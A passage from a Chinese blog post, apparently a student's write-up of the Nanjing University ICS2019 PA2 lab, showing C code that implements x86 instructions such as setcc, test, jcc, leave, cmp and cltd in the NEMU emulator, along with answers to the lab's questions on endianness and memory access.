class="hljs-built_in">print_asm</span>(<span class="hljs-string">"ret"</span>);}</code></pre></div></div><p><strong><font color="green">HIT GOOD TRAP!</font></strong></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210952140025_873_20230523225449300327_530_image-20230417213124076.png" alt="image-20230417213124076"><figcaption aria-hidden="true">image-20230417213124076</figcaption></figure><h3 id="问题">问题</h3><h6 id="立即数背后的故事">立即数背后的故事</h6><p>放到大端机上运行的时候内存布局，NEMU读取方式是一样的，但CPU的解释方式不一样了，因此会出问题。</p><p>怎么解决，既然NEMU是一个模拟器，就看QEMU是怎么解决的。模拟器确实需要<a href="https://github.com/coreos/qemu/blob/master/include/qemu/bswap.h">解决</a>这个问题</p><p>mips32和riscv32的指令长度只有32位, 因此它们不能像x86那样,把C代码中的32位常数直接编码到一条指令中.mips32和riscv32应该如何解决这个问题?</p><p>我们在机组课上学过MIPS指令。MIPS是通过<code>lui</code>和<code>ori</code>用两条指令分别加载高16位和低16位立即数。</p><p>riscv虽然不甚了解，但查阅资料<a href="https://blog.csdn.net/zoomdy/article/details/83067689">可知</a>也是通过类似的思虑进行的。</p><h6 id="拦截客户程序访存越界的非法行为">拦截客户程序访存越界的非法行为</h6><p>你将来很可能会遇到客户程序访存越界的错误,NEMU的框架代码一旦检测到这一行为就会直接panic.这一行为的检测已经极大地帮助你发现代码的问题了, 想象一下,如果NEMU并未拦截这一error, 你可能会看到怎么样的failure?</p><p>事实上访问到无法控制的内存，得到错误的结果甚至core dump。</p><h6 id="神秘的host内存访问-建议二周目思考">神秘的host内存访问(建议二周目思考)</h6><p>为什么需要有host内存访问的RTL指令呢?</p><p>阅读源码发现，用到host内存访问指令的是</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1vgcgclluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-1vgcgclluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">rtl_lr</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span>* dest, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> width)</span> </span>{ <span class="hljs-keyword">switch</span> (width) {  <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: <span class="hljs-built_in">rtl_mv</span>(dest, &amp;<span class="hljs-built_in">reg_l</span>(r)); <span class="hljs-keyword">return</span>;  <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-built_in">rtl_host_lm</span>(dest, &amp;<span class="hljs-built_in">reg_b</span>(r), <span class="hljs-number">1</span>); <span class="hljs-keyword">return</span>;  <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-built_in">rtl_host_lm</span>(dest, &amp;<span class="hljs-built_in">reg_w</span>(r), <span class="hljs-number">2</span>); <span class="hljs-keyword">return</span>;  <span class="hljs-keyword">default</span>: <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>); }}</code></pre></div></div><p>lr或sr的时候宽度小于4</p><p>而<code>guest</code>内存访问和<code>host</code>内存访问指令的区别在于一个是直接赋值，另一个是经过了<code>vaddr</code>转换。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-escjzvlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-escjzvlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">interpret_rtl_lm</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span> *dest, <span class="hljs-type">const</span> <span class="hljs-type">rtlreg_t</span>* addr, <span class="hljs-type">int</span> len)</span> </span>{  *dest = <span class="hljs-built_in">vaddr_read</span>(*addr, len);}</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wqv0a9lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-wqv0a9lluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">interpret_rtl_host_lm</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span>* dest, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *addr, <span class="hljs-type">int</span> len)</span> </span>{  <span class="hljs-keyword">switch</span> (len) {    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: *dest = *(<span class="hljs-type">uint32_t</span> *)addr; <span class="hljs-keyword">return</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: *dest = *( <span class="hljs-type">uint8_t</span> *)addr; <span class="hljs-keyword">return</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: *dest = *(<span class="hljs-type">uint16_t</span> *)addr; <span class="hljs-keyword">return</span>;    <span class="hljs-keyword">default</span>: <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }}</code></pre></div></div><p><code>vaddr_read</code>是由MMU来完成的。目前不是很明白调用不同宽度的lr会导致读的内存类型不一样，对这个问题也不太能做出满意的回答。</p><h2 id="二阶段">二阶段</h2><p>关于AM做了什么的事情，学校手册特意标了红色:</p><p>AM 在概念上定义了一台抽象计算机,它从运行程序的视角刻画了一台计算机应该具备的功能,而真机和NEMU都是这台抽象计算机的具体实现,只是真机是通过物理上存在的数字电路来实现,NEMU是通过程序来实现。</p><h3 id="更多指令实现">更多指令实现</h3><h4 id="任务-1">任务</h4><p><code>nemu</code>目录运行</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vzsea1lluwpkzu"></i><span>shell</span><div class="collapse show" id="collapse-vzsea1lluwpkzu"><pre><code class="hljs shell">bash runall.sh ISA=x86</code></pre></div></div><p>可以看到第一个需要实现的是<code>add_longlong</code>。</p><p>这里面第一个需要实现的指令是<code>lea</code></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210953365114_681_20230523225452474954_811_image-20230417215053287.png" alt="image-20230417215053287"><figcaption aria-hidden="true">image-20230417215053287</figcaption></figure><p>查表加上<code>opcode_table</code>之后提示我<code>exec_and</code>没实现。其实这不是<code>lea</code>的锅。因为框架把<code>make_EHelper(lea)</code>已经实现了，<code>lea</code>就这样完成了。实际上是因为<code>10060</code>的<code>and</code>指令导致的。</p><p>下一个是<code>pushl</code>。</p><p>在手册附录的Opcode Map发现这个位置是一个指令组:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210954270458_365_20230523225455484191_658_image-20230417221653277.png" alt="image-20230417221653277"><figcaption aria-hidden="true">image-20230417221653277</figcaption></figure><p>在Push页面能够看到对应的说明:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210955314802_440_20230523225457657194_609_image-20230417221609462.png" alt="image-20230417221609462"><figcaption aria-hidden="true">image-20230417221609462</figcaption></figure><p>上网查阅，反汇编码 <code>pushl</code> 相当于<code>push dword</code>。</p><p>这个<code>pushl</code>也是把指令组写了，把操作码写了，就完成了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210956604972_234_20230523225500684153_287_image-20230417222933927.png" alt="image-20230417222933927"><figcaption aria-hidden="true">image-20230417222933927</figcaption></figure><p><code>nop</code>也得专门整个<code>opcode</code></p><p>下面是add</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210958013044_302_20230523225502914875_765_image-20230417223533752.png" alt="image-20230417223533752"><figcaption aria-hidden="true">image-20230417223533752</figcaption></figure><p>看手册，正好一起把同类型的<code>add</code>都填了。</p><p>下面是<code>adc</code>。<code>adc</code>是带进位加法。其实开头的几个算术和逻辑指令格式都很像，参照着手册填下来就好了。</p><p>已经感受到这一部分更多的是体力活了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210959123415_355_20230523225508150223_875_image-20230417224319863.png" alt="image-20230417224319863"><figcaption aria-hidden="true">image-20230417224319863</figcaption></figure><p>可以看到0f是<code>2byte-escape</code>，这是我们遇到的第一个两字节操作码指令。查2字节的opcode，是这个</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828210959943782_857_20230523225511539214_937_image-20230417224352754.png" alt="image-20230417224352754"><figcaption aria-hidden="true">image-20230417224352754</figcaption></figure><p>这一堆setx指令都很像，属于条件置位指令。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211001084485_247_20230523225514028827_543_image-20230417224949597.png" alt="image-20230417224949597"><figcaption aria-hidden="true">image-20230417224949597</figcaption></figure><p>emm有一个手册里没有必须要看源码才知道的事情，就是<code>nemu</code>将这一类指令抽象成了<code>setcc</code></p><p>执行阶段给出了实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-k18aqwlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-k18aqwlluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(setcc) {  <span class="hljs-type">uint32_t</span> cc = decinfo.opcode &amp; <span class="hljs-number">0xf</span>;  <span class="hljs-built_in">rtl_setcc</span>(&amp;s0, cc);  <span class="hljs-built_in">operand_write</span>(id_dest, &amp;s0);  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"set%s %s"</span>, <span class="hljs-built_in">get_cc_name</span>(cc), id_dest-&gt;str);</code></pre></div></div><p><code>rtl_setcc</code>需要我们自己实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ser145lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-ser145lluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rtl_setcc</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span>* dest, <span class="hljs-type">uint8_t</span> subcode)</span> </span>{  <span class="hljs-type">bool</span> invert = subcode &amp; <span class="hljs-number">0x1</span>;  <span class="hljs-keyword">enum</span> {    CC_O, CC_NO, CC_B,  CC_NB,    CC_E, CC_NE, CC_BE, CC_NBE,    CC_S, CC_NS, CC_P,  CC_NP,    CC_L, CC_NL, CC_LE, CC_NLE  };  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Query EFLAGS to determine whether the condition code is satisfied.</span>  <span class="hljs-comment">// dest &lt;- ( cc is satisfied ? 1 : 0)</span>  <span class="hljs-keyword">switch</span> (subcode &amp; <span class="hljs-number">0xe</span>) {    <span class="hljs-keyword">case</span> CC_O:{<span class="hljs-built_in">rtl_get_OF</span>(dest);<span class="hljs-keyword">break</span>;}    <span class="hljs-keyword">case</span> CC_B:{<span class="hljs-built_in">rtl_get_CF</span>(dest);<span class="hljs-keyword">break</span>;}    <span class="hljs-keyword">case</span> CC_E:{<span class="hljs-built_in">rtl_get_ZF</span>(dest);<span class="hljs-keyword">break</span>;}    <span class="hljs-keyword">case</span> CC_BE:{<span class="hljs-built_in">rtl_get_CF</span>(&amp;t0);<span class="hljs-built_in">rtl_get_ZF</span>(&amp;t1);<span class="hljs-built_in">rtl_or</span>(dest,&amp;t0,&amp;t1);<span class="hljs-keyword">break</span>;}    <span class="hljs-keyword">case</span> CC_S:{<span class="hljs-built_in">rtl_get_SF</span>(dest);<span class="hljs-keyword">break</span>;}    <span class="hljs-keyword">case</span> CC_L:{<span class="hljs-built_in">rtl_get_SF</span>(&amp;t0);<span class="hljs-built_in">rtl_get_OF</span>(&amp;t1);<span class="hljs-built_in">rtl_xor</span>(dest,&amp;t0,&amp;t1);<span class="hljs-keyword">break</span>;}    <span class="hljs-keyword">case</span> CC_LE:{<span class="hljs-built_in">rtl_get_SF</span>(&amp;t0);<span class="hljs-built_in">rtl_get_OF</span>(&amp;t1);<span class="hljs-built_in">rtl_xor</span>(dest,&amp;t0,&amp;t1);<span class="hljs-built_in">rtl_get_ZF</span>(&amp;t0);<span class="hljs-built_in">rtl_or</span>(dest,dest,&amp;t0);<span class="hljs-keyword">break</span>;}      <span class="hljs-comment">//TODO();</span>    <span class="hljs-keyword">default</span>: <span class="hljs-built_in">panic</span>(<span class="hljs-string">"should not reach here"</span>);    <span class="hljs-keyword">case</span> CC_P: <span class="hljs-built_in">panic</span>(<span class="hljs-string">"n86 does not have PF"</span>);  }  <span class="hljs-keyword">if</span> (invert) {    <span class="hljs-built_in">rtl_xori</span>(dest, dest, <span class="hljs-number">0x1</span>);  }  <span class="hljs-built_in">assert</span>(*dest == <span class="hljs-number">0</span> || *dest == <span class="hljs-number">1</span>);}</code></pre></div></div><p>这一部分主要根据指令含义和文档完成。</p><p>至于填<code>opcode_table</code>，理解了之后自然就知道要填到下面一组了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211001972913_374_20230523225518351098_207_image-20230417230808371.png" alt="image-20230417230808371"><figcaption aria-hidden="true">image-20230417230808371</figcaption></figure><p>0f是2字节opcode，找第二个mapb对应的那一行</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211003032356_500_20230523225520582515_551_image-20230418013425827.png" alt="image-20230418013425827"><figcaption aria-hidden="true">image-20230418013425827</figcaption></figure><p>可以看到movvsx和movvzx。这两个指令都是在mov的基础上加了符号拓展功能。</p><p>可以看到框架里已经实现了，填表即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-sofc8llluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-sofc8llluwpkzu"><pre><code class="hljs C++"><span class="hljs-comment">/* 0xb4 */</span>EMPTY, EMPTY, <span class="hljs-built_in">IDEXW</span>(mov_E2G,movzx,<span class="hljs-number">1</span>), <span class="hljs-built_in">IDEXW</span>(mov_E2G,movzx,<span class="hljs-number">2</span>),<span class="hljs-comment">/* 0xb8 */</span>EMPTY, EMPTY, EMPTY, EMPTY,<span class="hljs-comment">/* 0xbc */</span>EMPTY, EMPTY, <span class="hljs-built_in">IDEXW</span>(mov_E2G,movsx,<span class="hljs-number">1</span>), <span class="hljs-built_in">IDEXW</span>(mov_E2G,movsx,<span class="hljs-number">2</span>),</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211004265633_434_20230523225522647884_770_image-20230418013811138.png" alt="image-20230418013811138"><figcaption aria-hidden="true">image-20230418013811138</figcaption></figure><p>test</p><p>根据手册，TEST 计算其两个操作数的按位逻辑与。每一位如果操作数的对应位均为 1，则结果为1，否则为0.运算结果被丢弃，只改变标志寄存器。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211005286340_139_20230523225525580415_996_image-20230418014447181.png" alt="image-20230418014447181"><figcaption aria-hidden="true">image-20230418014447181</figcaption></figure><p>据此实现即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wii956lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-wii956lluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(test) {  <span class="hljs-built_in">rtl_li</span>(&amp;s1,<span class="hljs-number">0</span>);  <span class="hljs-built_in">rtl_set_OF</span>(&amp;s1);  <span class="hljs-built_in">rtl_set_CF</span>(&amp;s1);  <span class="hljs-built_in">rtl_and</span>(&amp;s0,&amp;id_dest-&gt;val,&amp;id_src-&gt;val);  <span class="hljs-built_in">rtl_update_ZFSF</span>(&amp;s0,id_dest-&gt;width);  <span class="hljs-built_in">print_asm_template2</span>(test);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211006164465_661_20230523225528634250_287_image-20230418014935039.png" alt="image-20230418014935039"><figcaption aria-hidden="true">image-20230418014935039</figcaption></figure><p>框架将这一类型的执行抽象成了<code>jcc</code>，调用了之前提到的<code>setcc</code>。因此可以这样填:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ruqdi8lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-ruqdi8lluwpkzu"><pre><code class="hljs C++"><span class="hljs-comment">/* 0x70 */</span><span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-comment">/* 0x74 */</span><span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-comment">/* 0x78 */</span><span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-comment">/* 0x7c */</span><span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),<span class="hljs-built_in">IDEXW</span>(J,jcc,<span class="hljs-number">1</span>),</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211007026317_528_20230523225532714858_663_image-20230418015752384.png" alt="image-20230418015752384"><figcaption aria-hidden="true">image-20230418015752384</figcaption></figure><p>leave</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211008006723_218_20230523225537226215_675_image-20230418015919938.png" alt="image-20230418015919938"><figcaption aria-hidden="true">image-20230418015919938</figcaption></figure><p>填表，补充执行逻辑:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bh14tslluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-bh14tslluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(leave) {<span class="hljs-comment">//  TODO();</span>  <span class="hljs-built_in">rtl_mv</span>(&amp;cpu.esp,&amp;cpu.ebp);  <span class="hljs-built_in">rtl_pop</span>(&amp;cpu.ebp);  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"leave"</span>);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211008961219_129_20230523225541621025_331_image-20230418020130781.png" alt="image-20230418020130781"><figcaption aria-hidden="true">image-20230418020130781</figcaption></figure><p>dec，inc，cmp</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3masdglluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-3masdglluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(cmp) {<span class="hljs-comment">//  TODO();</span><span class="hljs-built_in">rtl_sub</span>(&amp;s0,&amp;id_dest-&gt;val,&amp;id_src-&gt;val);<span class="hljs-built_in">rtl_update_ZFSF</span>(&amp;s0,id_dest-&gt;width);<span class="hljs-built_in">rtl_is_sub_carry</span>(&amp;s1,&amp;s0,&amp;id_dest-&gt;val);<span class="hljs-comment">//printf("%d %d %d %d\n",s1,s0,id_dest-&gt;val,id_dest-&gt;width);</span><span class="hljs-built_in">rtl_set_CF</span>(&amp;s1);<span class="hljs-built_in">rtl_is_sub_overflow</span>(&amp;s1,&amp;s0,&amp;id_dest-&gt;val,&amp;id_src-&gt;val,id_dest-&gt;width);<span class="hljs-built_in">rtl_set_OF</span>(&amp;s1);<span class="hljs-comment">//if (id_src-&gt;val==0x40) printf("bian=%d\n",id_dest-&gt;val);</span><span class="hljs-built_in">print_asm_template2</span>(cmp);}<span class="hljs-built_in">make_EHelper</span>(inc) {<span class="hljs-comment">//  TODO();</span><span class="hljs-built_in">rtl_li</span>(&amp;s1,<span class="hljs-number">1</span>);  <span class="hljs-built_in">rtl_add</span>(&amp;s0,&amp;id_dest-&gt;val,&amp;s1);<span class="hljs-built_in">rtl_update_ZFSF</span>(&amp;s0,id_dest-&gt;width);<span class="hljs-built_in">rtl_is_add_overflow</span>(&amp;s1,&amp;s0,&amp;id_dest-&gt;val,&amp;s1,id_dest-&gt;width);<span class="hljs-built_in">rtl_set_OF</span>(&amp;s1);<span class="hljs-built_in">operand_write</span>(id_dest,&amp;s0);<span class="hljs-built_in">print_asm_template1</span>(inc);}</code></pre></div></div><p><code>dec</code>一样的道理，就不放了。</p><p>终于迎来了二阶段的第一个<strong><font color="green">HIT GOODTRAP</font></strong>！<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211009777130_241_20230523225545270182_921_image-20230418023433434.png" alt="image-20230418023433434"></p><p>加上中间填<code>op_table</code>习惯性的把旁边的也填了，其实现在就已经过的不少了。而且也发现名称排列和难度并不是对应的。。。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211010814853_962_20230523225547548141_708_image-20230418024006777.png" alt="image-20230418024006777"><figcaption aria-hidden="true">image-20230418024006777</figcaption></figure><p>比如<code>add</code>里面有一个0x6a打头的push，中间做的时候也把它写了。</p><p>bit里面这个指令还过不去</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211011974792_798_20230523225552798478_263_image-20230418024335643.png" alt="image-20230418024335643"><figcaption aria-hidden="true">image-20230418024335643</figcaption></figure><p>看手册是<code>Shift Grp2</code>的指令，看源码是<code>sar</code>指令。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211012908169_848_20230523225556392323_529_image-20230418024515008.png" alt="image-20230418024515008"><figcaption aria-hidden="true">image-20230418024515008</figcaption></figure><p>这一组带S指令都有移位功能，源码里的TODO也挨着，就对着手册一起做了。</p><p>框架中没有<code>exec_rol</code>，现在<code>make_group</code>的时候加上会报错。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211015047565_478_20230523225600429965_544_image-20230418030440421.png" alt="image-20230418030440421"><figcaption aria-hidden="true">image-20230418030440421</figcaption></figure><p>这个是<code>not</code>，对应第三个指令组，开填。</p><p>至于实现，这应该是最简单的一个。。。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-403ub6lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-403ub6lluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(<span class="hljs-keyword">not</span>) {<span class="hljs-comment">//  TODO();</span>  <span class="hljs-built_in">rtl_not</span>(&amp;s0,&amp;id_dest-&gt;val);  <span class="hljs-built_in">operand_write</span>(id_dest,&amp;s0);  <span class="hljs-built_in">print_asm_template1</span>(<span class="hljs-keyword">not</span>);}</code></pre></div></div><p>还有一个<code>rtl_not</code></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zz4zxplluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-zz4zxplluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">rtl_not</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span> *dest, <span class="hljs-type">const</span> <span class="hljs-type">rtlreg_t</span>* src1)</span> </span>{  <span class="hljs-comment">// dest &lt;- ~src1</span><span class="hljs-comment">//  TODO();</span>*dest=~(*src1);}</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211016555061_465_20230523225605558034_150_image-20230418031209236.png" alt="image-20230418031209236"><figcaption aria-hidden="true">image-20230418031209236</figcaption></figure><p>到div了。</p><p>imul</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211017591066_520_20230523225610807036_934_image-20230418032107060.png" alt="image-20230418032107060"><figcaption aria-hidden="true">image-20230418032107060</figcaption></figure><p>填表即可。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211018515110_896_20230523225613870020_798_image-20230418032213094.png" alt="image-20230418032213094"><figcaption aria-hidden="true">image-20230418032213094</figcaption></figure><p>符号拓展</p><p>这个要填rtl。利用好抽象层的东西。不就是把低位搬到高位么。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-626022lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-626022lluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">rtl_sext</span><span class="hljs-params">(<span class="hljs-type">rtlreg_t</span>* dest, <span class="hljs-type">const</span> <span class="hljs-type">rtlreg_t</span>* src1, <span class="hljs-type">int</span> width)</span> </span>{  <span class="hljs-comment">// dest &lt;- signext(src1[(width * 8 - 1) .. 0])</span><span class="hljs-comment">//  TODO();</span><span class="hljs-built_in">rtl_shli</span>(&amp;t0,src1,<span class="hljs-number">32</span>-width*<span class="hljs-number">8</span>);<span class="hljs-built_in">rtl_sari</span>(dest,&amp;t0,<span class="hljs-number">32</span>-width*<span class="hljs-number">8</span>);}</code></pre></div></div><p>下面指令果然涉及到了符号拓展。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211019431563_647_20230523225618043780_280_image-20230418033030503.png" alt="image-20230418033030503"><figcaption aria-hidden="true">image-20230418033030503</figcaption></figure><p>手册里说这个位置是cwd，但</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA2/20230828211020458211_219_20230523225621183658_884_image-20230418033009533.png" alt="image-20230418033009533"><figcaption aria-hidden="true">image-20230418033009533</figcaption></figure><p>框架中给的是cltd和cwtl，cltd就是CWD/CDQ，而cwtl对应CBW/CWDE。</p><p>按理说可以调抽象层的接口，但我总是调不对。。只好重新造轮子了。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lnyhcjlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-lnyhcjlluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(cltd) {  <span class="hljs-keyword">if</span> (decinfo.isa.is_operand_size_16) {    <span class="hljs-comment">//TODO();</span>    <span class="hljs-keyword">if</span> ((cpu.eax&gt;&gt;<span class="hljs-number">15</span>)&amp;<span class="hljs-number">1</span>) cpu.edx|=<span class="hljs-number">0x0000ffff</span>;    <span class="hljs-keyword">else</span> cpu.edx&amp;=<span class="hljs-number">0xffff0000</span>;  }  <span class="hljs-keyword">else</span> {    <span class="hljs-comment">//TODO();</span>    <span class="hljs-keyword">if</span> 